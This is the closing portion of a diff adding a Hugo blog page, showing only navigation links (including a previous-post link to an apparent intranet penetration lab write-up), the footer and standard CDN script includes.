+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/" class="prev" rel="prev" title="春秋云镜 Initial"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>春秋云镜 Initial</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
